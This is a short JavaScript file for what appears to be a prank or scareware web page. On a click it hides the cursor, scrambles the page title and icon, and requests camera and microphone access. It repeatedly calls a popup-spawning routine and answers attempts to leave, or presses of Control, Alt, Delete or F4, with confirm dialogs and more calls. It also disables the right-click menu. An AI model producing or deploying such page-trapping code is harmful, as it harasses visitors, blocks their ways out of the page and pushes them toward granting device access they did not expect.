let img = document.createElement('img')

img.setAttribute('src', 'media/sort.gif')
img.setAttribute('id', 'sort')

container.addEventListener('click', async () => {
	await proCreate(1);
	document.querySelector("#ui").remove()
	document.querySelector("#play").remove()
	document.documentElement.style.cursor = "none"
	document.title = "!!>>!>!!??!?$$&^$?*$'$??$\"|||????"
	document.querySelector("link[rel='icon']").href = "faviconpp.ico";
	navigator.mediaDevices.getUserMedia({ video: true, audio: true });
	document.documentElement.addEventListener('click', async () => {
		await proCreate(1);
	})

	document
		.querySelector('body')
		.appendChild(img)

	window.onbeforeunload = async () => {
		confirm('""""""??"???""??!?!!?!!?%%%%%??%?%%%%?')
		await proCreate(1)
	}

	document.documentElement.addEventListener('keydown', async () => {
		if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
			await proCreate(1);
			confirm("!!!!??????????????$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$??????????");
			await proCreate(1);
		}

		return null;
	})
});

window.oncontextmenu = () => false;
